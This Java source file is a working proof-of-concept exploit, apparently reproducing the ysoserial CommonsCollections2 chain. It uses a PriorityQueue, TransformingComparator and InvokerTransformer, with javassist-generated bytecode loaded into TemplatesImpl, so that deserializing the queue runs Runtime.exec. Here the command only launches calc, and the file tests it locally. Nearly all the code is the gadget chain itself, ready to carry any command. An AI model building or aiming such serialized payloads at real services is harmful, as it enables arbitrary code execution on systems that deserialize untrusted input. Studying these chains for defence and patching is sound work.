package mypoc.CCExp;

import javassist.*;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class CC2yso {
    static void setFieldValue(Object object, String member, Object value) throws Exception {
        Class<TemplatesImpl> templatesClass = TemplatesImpl.class;
        Field bytecodes = templatesClass.getDeclaredField(member);
        bytecodes.setAccessible(true);
        bytecodes.set(object, value);
    }

    public static void main(String[] args) throws Exception {
        // 控制transform
        InvokerTransformer evilTransformer = new InvokerTransformer("newTransformer", null, null);
        TransformingComparator transformingComparator = new TransformingComparator(evilTransformer);

        PriorityQueue priorityQueue = new PriorityQueue(1);
        // 确保size > 2
        // j>>>i 与 j/(int)(Math.pow(2,i))的结果相同，其中i和j是整形。
        /*
        *     private void heapify() {
        for (int i = (size >>> 1) - 1; i >= 0; i--)
            siftDown(i, (E) queue[i]);
        }*/
        priorityQueue.add(1);
        priorityQueue.add(2);

        // 反射获取comparator并设置为恶意的transformingComparator
        Class<PriorityQueue> priorityQueueClass = PriorityQueue.class;
        Field comparator = priorityQueueClass.getDeclaredField("comparator");
        comparator.setAccessible(true);
        comparator.set(priorityQueue, transformingComparator);

        // 生成恶意的Class字节码
        ClassPool aDefault = ClassPool.getDefault();
        // add AbstractTranslet to aDefault
        aDefault.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass calc = aDefault.makeClass("Calc");
        String cmd = "java.lang.Runtime.getRuntime().exec(\"calc\");";
        // static code block
        calc.makeClassInitializer().insertBefore(cmd);
        calc.setSuperclass(aDefault.get(AbstractTranslet.class.getName()));
        // evil bytes array
        byte[] bytes = calc.toBytecode();
        byte[][] evilBytes = new byte[][]{bytes};

        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_bytecodes", evilBytes);
        setFieldValue(templates, "_name", "Calc");
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());

        // 获取queue
        Object[] queueArray = {templates, 1};

        Field queue = priorityQueueClass.getDeclaredField("queue");
        queue.setAccessible(true);
        queue.set(priorityQueue, queueArray);


        // 本地测试
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(priorityQueue);
        objectOutputStream.close();
        System.out.println(byteArrayOutputStream);

        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray());
        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
        objectInputStream.readObject();

    }
}
